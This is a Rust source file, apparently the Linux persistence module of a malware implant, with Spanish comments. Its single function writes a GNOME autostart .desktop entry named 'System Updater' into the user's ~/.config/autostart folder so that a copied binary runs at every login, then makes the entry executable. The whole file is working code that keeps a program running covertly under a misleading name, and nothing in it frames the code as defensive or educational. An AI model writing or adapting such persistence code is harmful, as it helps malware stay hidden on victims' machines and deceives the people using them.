// persistence/linux.rs
use std::path::PathBuf;
use std::fs;
use std::env;

pub fn install_persistence(copias: &[PathBuf]) -> Result<(), Box<dyn std::error::Error>> {
    println!("🐧 Instalando persistencia en Linux...");

    if let Some(primary) = copias.first() {
        let home = env::var("HOME")?;

        // 1. Crear archivo .desktop para autostart
        let desktop_content = format!(
            r#"[Desktop Entry]
Type=Application
Name=System Updater
Exec={}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true"#,
            primary.display()
        );

        let autostart_dir = format!("{}/.config/autostart", home);
        fs::create_dir_all(&autostart_dir)?;

        let desktop_path = format!("{}/system-updater.desktop", autostart_dir);
        fs::write(&desktop_path, desktop_content)?;
        println!("✅ Autostart creado: {}", desktop_path);

        // 2. Hacer ejecutable el .desktop
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&desktop_path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&desktop_path, perms)?;
        println!("✅ Autostart configurado");
    }

    Ok(())
}
